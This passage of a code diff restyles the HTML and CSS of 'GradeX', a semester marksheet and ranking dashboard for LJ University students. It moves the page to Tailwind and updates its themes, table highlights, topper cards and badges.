@@ -4,614 +4,349 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GradeX | Ultimate Marksheet</title>
+    <title>GradeX | Ultimate Sem-IV Marksheet</title>
+    <meta name="description" content="Advanced Academic Performance Dashboard for LJ University - Semester IV">
+
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
-        href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Outfit:wght@300;400;500;600;700;800&display=swap"
+        href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@300;400;500;600;700;800&display=swap"
         rel="stylesheet">
-    <!-- Icons -->
+
+    <!-- Icons & Charts -->
     <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
-    <!-- Charts -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
+    <!-- TailwindCSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: ['selector', '[data-theme="dark"]'],
+            theme: {
+                extend: {
+                    colors: {
+                        surface: { DEFAULT: 'var(--bg-surface)', '2': 'var(--bg-surface-2)' },
+                        bdr: 'var(--border)',
+                        pri: { DEFAULT: '#7c6aef', soft: 'rgba(124,106,239,0.12)', glow: 'rgba(124,106,239,0.25)' },
+                        txt: { DEFAULT: 'var(--text)', sec: 'var(--text-secondary)', tri: 'var(--text-tertiary)' }
+                    },
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'], sig: ['Great Vibes', 'cursive'], outfit: ['Outfit', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
     <style>
         :root {
-            /* Defaults (Dark Mode) */
-            --bg-body: #0f111a;
-            --bg-glass: rgba(30, 34, 45, 0.6);
-            --bg-glass-hover: rgba(255, 255, 255, 0.03);
-            --border-glass: rgba(255, 255, 255, 0.08);
-
-            --primary: #6c5ce7;
-            --primary-glow: rgba(108, 92, 231, 0.4);
-
-            --text-main: #ffffff;
-            --text-muted: #a4b0be;
-            --text-inv: #000;
-
-            --accent: #00cec9;
-            --secondary: #e84393;
-            --success: #00b894;
-            --warning: #fdcb6e;
-
-            --ease: cubic-bezier(0.23, 1, 0.32, 1);
+            --bg-body: #07080d;
+            --bg-surface: #10111a;
+            --bg-surface-2: #181924;
+            --bg-hover: rgba(255, 255, 255, 0.04);
+            --border: rgba(255, 255, 255, 0.07);
+            --text: #f0f0f5;
+            --text-secondary: #8b8fa3;
+            --text-tertiary: #5c5f73;
         }
 
         [data-theme="light"] {
-            --bg-body: #f0f2f5;
-            --bg-glass: rgba(255, 255, 255, 0.85);
-            --bg-glass-hover: rgba(0, 0, 0, 0.02);
-            --border-glass: rgba(0, 0, 0, 0.05);
-
-            --text-main: #2d3436;
-            --text-muted: #636e72;
-            --text-inv: #fff;
-
-            --primary: #5844e3;
-            /* Slightly darker for contrast */
-            --primary-glow: rgba(88, 68, 227, 0.2);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-font-smoothing: antialiased;
+            --bg-body: #f5f6fa;
+            --bg-surface: #ffffff;
+            --bg-surface-2: #f0f1f5;
+            --bg-hover: rgba(0, 0, 0, 0.03);
+            --border: rgba(0, 0, 0, 0.06);
+            --text: #1a1a2e;
+            --text-secondary: #6b7085;
+            --text-tertiary: #9ca0b0;
         }
 
         body {
-            font-family: 'Outfit', sans-serif;
-            background-color: var(--bg-body);
-            background-image:
-                radial-gradient(circle at 10% 20%, rgba(108, 92, 231, 0.05) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(0, 206, 201, 0.05) 0%, transparent 40%);
-            background-attachment: fixed;
-            color: var(--text-main);
-            min-height: 100vh;
-            padding: 40px 20px;
+            background: var(--bg-body);
+            color: var(--text);
+            font-family: 'Inter', system-ui, sans-serif;
+            transition: background 0.4s, color 0.4s;
+            position: relative;
             overflow-x: hidden;
-            transition: background 0.5s var(--ease), color 0.5s var(--ease);
         }
 
+        /* Ambient background glow orbs */
+        body::before,
+        body::after {
+            content: '';
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.08;
+            z-index: 0;
+            pointer-events: none;
+            animation: orb-float 20s ease-in-out infinite alternate;
+        }
+
+        body::before {
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, #7c6aef 0%, transparent 70%);
+            top: -150px;
+            left: -100px;
+        }
+
+        body::after {
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, #22d3ee 0%, transparent 70%);
+            bottom: -120px;
+            right: -80px;
+            animation-delay: -10s;
+        }
+
+        [data-theme="light"] body::before,
+        [data-theme="light"] body::after {
+            opacity: 0.04;
+        }
+
+        @keyframes orb-float {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+
+            50% {
+                transform: translate(40px, 30px) scale(1.1);
+            }
+
+            100% {
+                transform: translate(-20px, -15px) scale(0.95);
+            }
+        }
+
+        /* Scrollbar */
         ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
+            width: 5px;
+            height: 5px;
         }
 
         ::-webkit-scrollbar-track {
-            background: var(--bg-body);
+            background: transparent;
         }
 
         ::-webkit-scrollbar-thumb {
-            background: #888;
-            border-radius: 4px;
+            background: var(--text-tertiary);
+            border-radius: 3px;
         }
 
-        ::-webkit-scrollbar-thumb:hover {
-            background: #555;
-        }
-
-        .container {
-            max-width: 1600px;
-            margin: 0 auto;
+        /* Card base */
+        .card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            transition: background 0.4s, border-color 0.25s, box-shadow 0.3s;
             position: relative;
-            z-index: 10;
-        }
-
-        .glass-panel {
-            background: var(--bg-glass);
-            backdrop-filter: blur(20px) saturate(180%);
-            -webkit-backdrop-filter: blur(20px) saturate(180%);
-            border: 1px solid var(--border-glass);
-            border-radius: 24px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.05);
-            transition: background 0.5s var(--ease), box-shadow 0.3s var(--ease);
-        }
-
-        /* Header */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 40px;
-            padding: 20px 0;
-            animation: fadeInDown 0.8s var(--ease);
-        }
-
-        .brand h1 {
-            font-size: 3rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--text-main) 0%, var(--primary) 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
-            letter-spacing: -1px;
-        }
-
-        .brand p {
-            color: var(--text-muted);
-            font-size: 1.1rem;
-            font-weight: 300;
-            letter-spacing: 1px;
-        }
-
-        .actions {
-            display: flex;
-            gap: 15px;
-            align-items: center;
-        }
-
-        .btn {
-            background: var(--bg-glass);
-            border: 1px solid var(--border-glass);
-            color: var(--text-main);
-            padding: 12px 24px;
-            border-radius: 50px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s var(--ease);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.9rem;
-            font-family: inherit;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        /* Theme Toggle Switch */
-        .theme-switch {
-            position: relative;
-            width: 80px;
-            height: 40px;
-            border-radius: 50px;
-            background: var(--bg-glass);
-            border: 1px solid var(--border-glass);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 5px;
-            transition: all 0.3s var(--ease);
-            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
-
-        .theme-switch .icon {
-            font-size: 1.2rem;
-            width: 50%;
-            text-align: center;
             z-index: 1;
-            color: var(--text-muted);
-            transition: color 0.3s;
         }
 
-        .theme-switch .ball {
+        .card:hover {
+            border-color: rgba(124, 106, 239, 0.15);
+            box-shadow: 0 4px 24px -4px rgba(124, 106, 239, 0.06);
+        }
+
+        [data-theme="light"] .card:hover {
+            border-color: rgba(108, 92, 231, 0.12);
+            box-shadow: 0 4px 24px -4px rgba(108, 92, 231, 0.08);
+        }
+
+        /* Tab indicator animated pill */
+        .tab-pill {
             position: absolute;
-            top: 4px;
-            left: 4px;
-            width: 30px;
-            height: 30px;
-            background: var(--primary);
-            border-radius: 50%;
-            transition: transform 0.4s var(--ease);
-            box-shadow: 0 2px 10px var(--primary-glow);
-            z-index: 0;
-        }
-
-        /* Light Mode State for Switch */
-        [data-theme="light"] .theme-switch .ball {
-            transform: translateX(40px);
-            background: #f1c40f;
-            /* Sun color */
-            box-shadow: 0 2px 10px rgba(241, 196, 15, 0.4);
-        }
-
-        [data-theme="light"] .theme-switch .icon.sun {
-            color: #fff;
-        }
-
-        [data-theme="dark"] .theme-switch .icon.moon {
-            color: #fff;
-        }
-
-
-        /* Dashboard & Charts */
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 25px;
-            margin-bottom: 30px;
-        }
-
-        .analytics-card {
-            padding: 25px;
-            height: 350px;
-            position: relative;
-        }
-
-        .analytics-header {
-            margin-bottom: 20px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        /* Stats */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        .stat-card {
-            padding: 24px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            transition: transform 0.3s var(--ease);
-        }
-
-        .stat-card:hover {
-            transform: translateY(-5px) scale(1.02);
-            border-color: var(--primary);
-        }
-
-        .stat-label {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-        }
-
-        .stat-value {
-            font-size: 2.5rem;
-            font-weight: 700;
-            background: linear-gradient(to right, var(--text-main), var(--text-muted));
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .stat-icon {
-            position: absolute;
-            right: 20px;
-            bottom: 20px;
-            font-size: 3rem;
-            opacity: 0.1;
-            color: var(--text-main);
-        }
-
-        /* Controls */
-        .controls-bar {
-            padding: 15px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-
-        .view-tabs {
-            background: var(--bg-glass-hover);
-            border: 1px solid var(--border-glass);
-            border-radius: 50px;
-            padding: 5px;
-            display: flex;
-            position: relative;
-        }
-
-        .tab-btn {
-            background: transparent;
-            border: none;
-            color: var(--text-muted);
-            padding: 10px 25px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-weight: 600;
-            position: relative;
-            z-index: 2;
-            transition: color 0.3s ease;
-            font-family: inherit;
-        }
-
-        .tab-btn.active {
-            color: #fff;
-        }
-
-        [data-theme="light"] .tab-btn.active {
-            color: #fff;
-        }
-
-        .tab-indicator {
-            position: absolute;
-            top: 5px;
-            left: 5px;
-            height: calc(100% - 10px);
-            background: var(--primary);
-            border-radius: 40px;
+            top: 3px;
+            left: 3px;
+            height: calc(100% - 6px);
+            background: #7c6aef;
+            border-radius: 100px;
             z-index: 1;
-            transition: all 0.4s var(--ease);
-            box-shadow: 0 4px 15px var(--primary-glow);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 2px 8px rgba(124, 106, 239, 0.25);
         }
 
-        .filter-group {
-            display: flex;
-            gap: 15px;
-            align-items: center;
+        /* Theme ball */
+        .theme-ball {
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .search-wrapper {
-            position: relative;
-            width: 300px;
+        [data-theme="light"] .theme-ball {
+            transform: translateX(34px);
+            background: #f59e0b !important;
+            box-shadow: 0 2px 8px rgba(245, 158, 11, 0.3);
         }
 
-        .search-wrapper i {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-muted);
+        [data-theme="dark"] .icon-moon {
+            color: #fff !important;
         }
 
-        .control-input {
-            width: 100%;
-            background: var(--bg-glass-hover);
-            border: 1px solid var(--border-glass);
-            padding: 12px 12px 12px 45px;
-            border-radius: 12px;
-            color: var(--text-main);
-            font-family: inherit;
-            outline: none;
-            transition: all 0.3s ease;
+        [data-theme="light"] .icon-sun {
+            color: #fff !important;
         }
 
-        .control-input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 4px var(--primary-glow);
+        [data-theme="light"] .tab-pill {
+            background: #6c5ce7;
         }
 
-        select.control-input {
-            padding: 12px 20px;
+        /* Form input */
+        .fi {
+            background: var(--bg-surface-2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
-        select.control-input option {
-            background-color: var(--bg-body);
-            color: var(--text-main);
+        .fi:focus {
+            border-color: #7c6aef;
+            box-shadow: 0 0 0 3px rgba(124, 106, 239, 0.12);
+        }
+
+        .fi option {
+            background: var(--bg-surface);
+            color: var(--text);
         }
 
         /* Table */
-        .table-wrapper {
-            overflow: hidden;
-        }
-
-        .table-scroll {
-            overflow-x: auto;
-            max-height: 800px;
-        }
-
-        table {
-            width: 100%;
+        .tbl {
             border-collapse: collapse;
-            font-size: 0.95rem;
+            font-size: 0.82rem;
         }
 
-        thead th {
-            text-align: left;
-            padding: 20px;
-            color: var(--text-muted);
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 0.8rem;
-            letter-spacing: 0.5px;
-            border-bottom: 1px solid var(--border-glass);
-            background: var(--bg-glass);
-            backdrop-filter: blur(10px);
+        .tbl thead th {
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border);
             position: sticky;
             top: 0;
             z-index: 10;
             cursor: pointer;
             user-select: none;
+            transition: color 0.2s;
         }
 
-        thead th:hover {
-            color: var(--primary);
+        .tbl thead th:hover {
+            color: #7c6aef;
         }
 
-        tbody tr {
-            border-bottom: 1px solid var(--border-glass);
-            transition: background 0.2s;
+        .tbl tbody tr {
+            border-bottom: 1px solid var(--border);
+            transition: background 0.15s;
         }
 
-        tbody tr:hover {
-            background: var(--bg-glass-hover);
+        .tbl tbody tr:hover {
+            background: var(--bg-hover);
         }
 
-        td {
-            padding: 18px 20px;
-            white-space: nowrap;
+        /* Cell helpers */
+        .c-rank {
+            color: #7c6aef;
+            font-variant-numeric: tabular-nums;
         }
 
-        .cell-rank {
-            font-weight: 800;
-            font-size: 1.1rem;
-            color: var(--primary);
+        [data-theme="light"] .c-rank {
+            color: #5b44d4;
         }
 
-        .cell-total {
-            font-weight: 700;
-            color: var(--success);
-            background: rgba(0, 184, 148, 0.1);
-            padding: 6px 12px;
-            border-radius: 6px;
+        .c-total {
+            color: #34d399;
+            background: rgba(52, 211, 153, 0.1);
+            font-variant-numeric: tabular-nums;
         }
 
-        /* Highlights */
-        .top-rank td {
-            background: linear-gradient(90deg, rgba(253, 203, 110, 0.1) 0%, transparent 100%);
+        [data-theme="light"] .c-total {
+            color: #059669;
+            background: rgba(5, 150, 105, 0.12);
         }
 
-        .top-rank .cell-rank {
-            color: var(--warning);
+        .c-enr {
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            color: var(--text-tertiary);
         }
 
-        .highlight-row {
-            border-left: 3px solid var(--secondary);
-            background: linear-gradient(90deg, rgba(232, 67, 147, 0.1) 0%, transparent 100%);
+        .c-div {
+            background: var(--bg-surface-2);
         }
 
-        .highlight-green {
-            border-left: 3px solid var(--success);
-            background: linear-gradient(90deg, rgba(0, 184, 148, 0.1) 0%, transparent 100%);
+        .c-num {
+            font-variant-numeric: tabular-nums;
         }
 
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
+        /* ═══ HIGHLIGHTS ═══ */
 
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        /* Top 3 Ranks — Dark */
+        .row-top td {
+            background: rgba(251, 191, 36, 0.10);
         }
 
-        .fade-in {
-            animation: fadeIn 0.5s ease forwards;
-            opacity: 0;
+        .row-top:hover td {
+            background: rgba(251, 191, 36, 0.15);
         }
 
-        @keyframes fadeIn {
-            to {
-                opacity: 1;
-            }
+        .row-top .c-rank {
+            color: #fbbf24;
+            text-shadow: 0 0 8px rgba(251, 191, 36, 0.3);
         }
 
-        @media (max-width: 1024px) {
-            .dashboard-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .controls-bar {
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .search-wrapper {
-                width: 100%;
-            }
+        /* Top 3 Ranks — Light */
+        [data-theme="light"] .row-top td {
+            background: rgba(245, 158, 11, 0.15) !important;
         }
 
-        /* Mobile specific adjustments */
-        @media (max-width: 768px) {
-            body {
-                padding: 20px 10px;
-            }
-
-            header {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 15px;
-                margin-bottom: 25px;
-            }
-
-            .actions {
-                width: 100%;
-                justify-content: space-between;
-            }
-
-            .brand h1 {
-                font-size: 2rem;
-            }
-
-            .brand p {
-                font-size: 0.95rem;
-            }
-
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .filter-group {
-                flex-direction: column;
-                width: 100%;
-            }
-
-            .control-input,
-            select.control-input {
-                width: 100% !important;
-            }
-
-            .view-tabs {
-                width: 100%;
-                overflow-x: auto;
-            }
-
-            .tab-btn {
-                flex: 1;
-                white-space: nowrap;
-            }
-
-            /* Hide theme text if space is tight, keep icon */
-            .theme-switch {
-                transform: scale(0.9);
-            }
+        [data-theme="light"] .row-top:hover td {
+            background: rgba(245, 158, 11, 0.22) !important;
         }
 
+        [data-theme="light"] .row-top .c-rank {
+            color: #b45309;
+            text-shadow: none;
+        }
 
-        /* Signature Styles for Daksh */
-        .sig-wrapper {
-            position: relative;
+        /* Special Highlighted Rows — Dark */
+        .row-hl {
+            border-left: 4px solid #ec4899 !important;
+        }
+
+        .row-hl td {
+            background: rgba(236, 72, 153, 0.12) !important;
+        }
+
+        .row-hl:hover td {
+            background: rgba(236, 72, 153, 0.18) !important;
+        }
+
+        .row-hl .hl-dot {
             display: inline-block;
-            text-align: center;
-            padding: 10px 0;
+            width: 7px;
+            height: 7px;
+            background: #ec4899;
+            border-radius: 50%;
+            box-shadow: 0 0 6px #ec4899;
+            margin-right: 6px;
+            vertical-align: middle;
         }
 
-        .sig-label {
-            display: block;
-            font-size: 0.6rem;
-            color: #5c6b9f;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 500;
-            margin-bottom: -5px;
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
-            margin-right: -20px;
-            /* Aligned per design */
-            font-family: 'Outfit', sans-serif;
+        /* Special Highlighted Rows — Light */
+        [data-theme="light"] .row-hl {
+            border-left: 4px solid #db2777 !important;
         }
 
-        .sig-text {
-            font-family: 'Great Vibes', cursive;
-            font-size: 1.5rem;
-            color: var(--text-main);
-            text-shadow: 0 0 10px rgba(108, 92, 231, 0.3);
-            line-height: 1;
-            white-space: nowrap;
+        [data-theme="light"] .row-hl td {
+            background: rgba(219, 39, 119, 0.12) !important;
         }
 
+        [data-theme="light"] .row-hl:hover td {
+            background: rgba(219, 39, 119, 0.18) !important;
+        }
+
+        [data-theme="light"] .row-hl .hl-dot {
+            background: #db2777;
+            box-shadow: 0 0 6px rgba(219, 39, 119, 0.5);
+        }
+
+        /* Crown animation */
         .sig-crown {
-            position: absolute;
-            top: 0;
-            right: -10px;
-            font-size: 1rem;
-            filter: drop-shadow(0 0 5px rgba(255, 211, 42, 0.4));
-            transform: rotate(15deg);
-            animation: floatCrown 3s ease-in-out infinite;
+            animation: fc 3s ease-in-out infinite;
         }
 
-        @keyframes floatCrown {
+        @keyframes fc {
 
             0%,
             100% {
@@ -623,580 +358,736 @@
             }
         }
 
-        /* Badge Styles */
-        .mark-badge {
-            display: inline-block;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-weight: 600;
-            font-size: 0.85rem;
-            min-width: 45px;
-            text-align: center;
+        /* Premium stat card glow on hover */
+        .stat-card {
+            transition: transform 0.25s cubic-bezier(.4, 0, .2, 1), box-shadow 0.3s, border-color 0.3s;
         }
-        .badge-green { background: rgba(0, 184, 148, 0.12); color: #2ecc71; border: 1px solid rgba(0, 184, 148, 0.2); }
-        .badge-blue { background: rgba(0, 206, 201, 0.12); color: #00cec9; border: 1px solid rgba(0, 206, 201, 0.2); }
-        .badge-yellow { background: rgba(253, 203, 110, 0.12); color: #f1c40f; border: 1px solid rgba(253, 203, 110, 0.2); }
-        .badge-red { background: rgba(232, 67, 147, 0.12); color: #e84393; border: 1px solid rgba(232, 67, 147, 0.2); }
-        .badge-topper { background: rgba(255, 215, 0, 0.18); color: #ffd700; border: 1px solid rgba(255, 215, 0, 0.4); font-weight: 700; box-shadow: 0 0 10px rgba(255, 215, 0, 0.15); }
 
-        /* Modal Styles */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10, 12, 18, 0.7);
-            backdrop-filter: blur(8px);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s var(--ease);
+        .stat-card:hover {
+            box-shadow: 0 8px 32px -6px rgba(124, 106, 239, 0.12);
         }
-        .modal-overlay.show {
-            opacity: 1;
-            pointer-events: auto;
-        }
-        .modal-card {
-            width: 90%;
-            max-width: 800px;
-            padding: 30px;
-            position: relative;
-            transform: scale(0.9);
-            transition: transform 0.3s var(--ease);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-        }
-        .modal-overlay.show .modal-card {
-            transform: scale(1);
-        }
-        .modal-close {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            font-size: 1.5rem;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-        .modal-close:hover {
-            color: var(--text-main);
-        }
-        .modal-header {
-            margin-bottom: 25px;
-            border-bottom: 1px solid var(--border-glass);
-            padding-bottom: 15px;
-        }
-        .modal-header h2 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, var(--text-main) 0%, var(--primary) 100%);
+
+        /* Animated gradient text for header */
+        .gradient-title {
+            background: linear-gradient(135deg, #ffffff 0%, #a78bfa 35%, #7c6aef 60%, #22d3ee 100%);
+            background-size: 200% 200%;
             -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             background-clip: text;
+            animation: gradient-shift 6s ease-in-out infinite;
+        }
+
+        [data-theme="light"] .gradient-title {
+            background: linear-gradient(135deg, #1a1a2e 0%, #5b44d4 35%, #7c6aef 60%, #0ea5e9 100%);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradient-shift 6s ease-in-out infinite;
+        }
+
+        @keyframes gradient-shift {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Premium version badge */
+        .version-badge {
+            background: linear-gradient(135deg, rgba(124, 106, 239, 0.15) 0%, rgba(34, 211, 238, 0.1) 100%);
+            border: 1px solid rgba(124, 106, 239, 0.2);
+            backdrop-filter: blur(8px);
+            animation: badge-pulse 4s ease-in-out infinite;
+        }
+
+        @keyframes badge-pulse {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(124, 106, 239, 0.1);
+            }
+
+            50% {
+                box-shadow: 0 0 12px 2px rgba(124, 106, 239, 0.08);
+            }
+        }
+
+        /* 🏆 Pro Topper Cards */
+        .pro-topper-card {
+            position: relative;
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        .pro-topper-card::after {
+            content: '';
+            position: absolute;
+            left: 0; bottom: 0;
+            width: 100%; height: 2px;
+            background: var(--subj-color);
+            box-shadow: 0 0 8px var(--subj-color);
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform 0.4s ease;
+        }
+
+        .pro-topper-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 24px -8px rgba(0,0,0,0.2);
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .pro-topper-card:hover::after {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        .pro-crown {
+            color: var(--subj-color);
+            font-size: 1.15rem;
+            filter: drop-shadow(0 0 6px var(--subj-color));
+            opacity: 0.8;
+            transition: all 0.3s ease;
+        }
+
+        .pro-topper-card:hover .pro-crown {
+            opacity: 1;
+            transform: scale(1.15) rotate(5deg);
+        }
+        
+        .pro-name {
+            font-weight: 800;
+            letter-spacing: -0.01em;
+            color: var(--text);
+            transition: color 0.3s;
+        }
+        
+        .pro-topper-card:hover .pro-name {
+            background: linear-gradient(90deg, #fff, #cbd5e1);
+            -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        .modal-header p {
-            color: var(--text-muted);
-            font-size: 0.95rem;
-            margin-top: 5px;
+
+        [data-theme="light"] .pro-topper-card:hover .pro-name {
+            background: linear-gradient(90deg, #0f172a, #475569);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .modal-body-grid {
-            display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 30px;
+        [data-theme="light"] .pro-topper-card {
+            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
         }
-        .modal-profile-column {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            border-right: 1px solid var(--border-glass);
-            padding-right: 20px;
+        [data-theme="light"] .pro-topper-card:hover {
+            box-shadow: 0 12px 24px -8px rgba(0,0,0,0.08);
+            border-color: rgba(0,0,0,0.08);
         }
-        .avatar-circle {
-            width: 90px;
-            height: 90px;
-            border-radius: 50%;
-            background: var(--bg-glass-hover);
-            border: 2px solid var(--border-glass);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3rem;
-            color: var(--primary);
-            margin-bottom: 20px;
-            box-shadow: 0 4px 20px var(--primary-glow);
+
+        /* Footer styling */
+        .footer-section {
+            border-top: 1px solid var(--border);
+            background: linear-gradient(180deg, transparent 0%, rgba(124, 106, 239, 0.02) 100%);
         }
-        .profile-detail-item {
-            width: 100%;
-            margin-bottom: 15px;
-            display: flex;
-            flex-direction: column;
+
+        [data-theme="light"] .footer-section {
+            background: linear-gradient(180deg, transparent 0%, rgba(108, 92, 231, 0.03) 100%);
         }
-        .detail-label {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+
+        /* Load-more bar */
+        .load-bar {
+            background: var(--bg-surface-2);
+            border-top: 1px solid var(--border);
         }
-        .detail-value {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-top: 2px;
+
+        /* Badges */
+        .badge-topper {
+            background: rgba(251, 191, 36, 0.2);
+            color: #fbbf24;
+            border: 1px solid rgba(251, 191, 36, 0.4);
         }
-        .modal-perf-column h3 {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: var(--text-main);
+
+        .badge-green {
+            background: rgba(52, 211, 153, 0.15);
+            color: #34d399;
         }
-        .subject-row {
-            margin-bottom: 12px;
+
+        .badge-blue {
+            background: rgba(96, 165, 250, 0.15);
+            color: #60a5fa;
         }
-        .subject-labels {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.85rem;
-            margin-bottom: 4px;
+
+        .badge-yellow {
+            background: rgba(251, 191, 36, 0.15);
+            color: #fbbf24;
         }
-        .subject-progress-bg {
-            width: 100%;
-            height: 8px;
-            background: var(--bg-glass-hover);
+
+        .badge-red {
+            background: rgba(248, 113, 113, 0.15);
+            color: #f87171;
+        }
+
+        .mark-badge {
+            padding: 2px 6px;
             border-radius: 4px;
-            overflow: hidden;
-        }
-        .subject-progress-bar {
-            height: 100%;
-            border-radius: 4px;
-            transition: width 0.5s ease-out;
-        }
-        .spi-timeline {
-            display: flex;
-            justify-content: space-between;
-            background: var(--bg-glass-hover);
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid var(--border-glass);
-        }
-        .spi-node {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .spi-sem {
-            font-size: 0.8rem;
-            color: var(--text-muted);
-        }
-        .spi-val {
-            font-size: 1.1rem;
-            font-weight: 700;
-            margin-top: 4px;
-        }
-        .spi-node.accent .spi-val {
-            color: var(--accent);
-        }
-
-        /* Toppers Styles */
-        .toppers-bar {
-            padding: 15px 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            background: var(--bg-glass);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-        }
-        .toppers-title {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.95rem;
             font-weight: 600;
-            color: var(--text-main);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .toppers-grid {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 15px;
-        }
-        @media (max-width: 1024px) {
-            .toppers-grid {
-                grid-template-columns: repeat(3, 1fr);
-            }
-        }
-        @media (max-width: 768px) {
-            .toppers-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-        }
-        @media (max-width: 480px) {
-            .toppers-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-        .topper-mini-card {
